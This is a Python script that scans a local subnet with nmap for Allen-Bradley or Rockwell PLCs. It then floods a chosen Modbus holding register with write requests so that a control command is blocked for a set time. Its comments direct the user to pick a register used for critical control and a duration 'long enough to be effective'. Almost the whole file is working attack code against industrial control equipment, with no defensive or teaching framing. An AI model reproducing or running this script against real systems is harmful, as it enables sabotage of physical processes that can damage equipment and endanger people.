import socket
import time
import struct
import subprocess  # Required for running shell commands

# --- Configuration ---
# PLC Communication Details
PLC_PORT = 502  # Standard Modbus port.  Adjust if necessary.
MODBUS_WRITE_REGISTER = 40001  #  Example holding register address to control. ADJUST THIS!  It needs to be one used for critical control.
MODBUS_BLOCK_VALUE = 0  #  Value to write to block the intended function. ADJUST THIS! Could be 0, could be another value.
MODBUS_ORIGINAL_VALUE = 1 #  This is the value that represents the command being executed.  ADJUST THIS!  This needs to be discovered through analysis!

# Script Configuration
BLOCK_DURATION = 60 # seconds - Time to block the command. ADJUST THIS!  Long enough to be effective, short enough to avoid critical system failures.
SLEEP_INTERVAL = 0.1 # seconds -  Time to sleep between attempts to block.  Should be short.
# --- End Configuration ---

def find_plc_ip():
    """
    Attempts to find the PLC's IP address by scanning the network.
    This is a simplified example and might need significant modification
    depending on your network setup and security policies.  This uses `nmap`.

    Requires Nmap to be installed and accessible in your system's PATH.
    """
    try:
        # Assumes the PLC is on the same subnet as the workstation.
        # Adapt the IP range as needed.  This is a very permissive scan.
        # A more targeted approach is HIGHLY recommended.
        nmap_result = subprocess.run(['nmap', '-sn', '192.168.1.0/24'], capture_output=True, text=True, check=True)
        output_lines = nmap_result.stdout.splitlines()

        for line in output_lines:
            if "Allen-Bradley" in line or "Rockwell" in line: # Add more relevant keywords specific to your PLC's Nmap output.
                # Extract IP from the line (might require adjustments depending on the Nmap output format)
                parts = line.split()
                ip_address = parts[4] # Changed to part 4 to get the correct IP address
                print(f"Found PLC IP: {ip_address}")
                return ip_address
        print("PLC not found on the network.")
        return None

    except subprocess.CalledProcessError as e:
        print(f"Error running Nmap: {e}")
        print("Ensure Nmap is installed and in your system's PATH.")
        return None
    except Exception as e:
        print(f"An error occurred during IP discovery: {e}")
        return None



def create_modbus_write_request(register_address, value):
    """
    Creates a Modbus write single register request.

    Args:
        register_address (int): The register address to write to.
        value (int): The value to write.

    Returns:
        bytes: The Modbus request as a byte string.
    """

    # Transaction Identifier (2 bytes) - Arbitrary, but must match in request/response
    transaction_id = 1234  # Example
    # Protocol Identifier (2 bytes) - 0 for Modbus TCP
    protocol_id = 0
    # Length (2 bytes) - Remaining bytes in the message
    length = 6  # Function code (1) + Address (2) + Value (2)
    # Unit Identifier (1 byte) - Often 1, but check your device configuration
    unit_id = 1
    # Function Code (1 byte) - 6 for Write Single Register
    function_code = 6
    # Register Address (2 bytes)
    address_bytes = register_address.to_bytes(2, 'big')
    # Value to Write (2 bytes)
    value_bytes = value.to_bytes(2, 'big')

    request = struct.pack(">H H H B B", transaction_id, protocol_id, length, unit_id, function_code) + address_bytes + value_bytes
    return request


def block_command(plc_ip, register_address, block_value):
    """
    Blocks a command by repeatedly writing a specific value to a Modbus register.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1) # Add a timeout to prevent indefinite blocking.
        sock.connect((plc_ip, PLC_PORT))


        start_time = time.time()
        while time.time() - start_time < BLOCK_DURATION:
            # Create Modbus write request
            modbus_request = create_modbus_write_request(register_address, block_value)

            # Send Modbus request
            sock.sendall(modbus_request)

            # Optionally, receive and validate the response (important for reliable operation)
            try:
                response = sock.recv(1024) # Adjust buffer size if needed.
                # In a real implementation, you'd parse the Modbus response
                # to verify that the write operation was successful.
                # This example simply checks for a non-empty response.
                if not response:
                    print("No response from PLC.  Possible connection issue.")
                    break # Exit the loop if the PLC isn't responding.
                #print(f"Received response: {response.hex()}") # Print response in hex for debugging
            except socket.timeout:
                print("Timeout receiving response from PLC.")
                break # Exit if we timeout waiting for a response.


            time.sleep(SLEEP_INTERVAL)

        print(f"Command blocked for {BLOCK_DURATION} seconds.")
        sock.close()

    except socket.error as e:
        print(f"Socket error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")



def main():
    """
    Main function to find the PLC's IP address and execute the command blocking.
    """
    plc_ip = find_plc_ip()

    if plc_ip:
        print(f"PLC IP found: {plc_ip}")
        block_command(plc_ip, MODBUS_WRITE_REGISTER, MODBUS_BLOCK_VALUE)
    else:
        print("PLC IP not found.  Exiting.")


if __name__ == "__main__":
    main()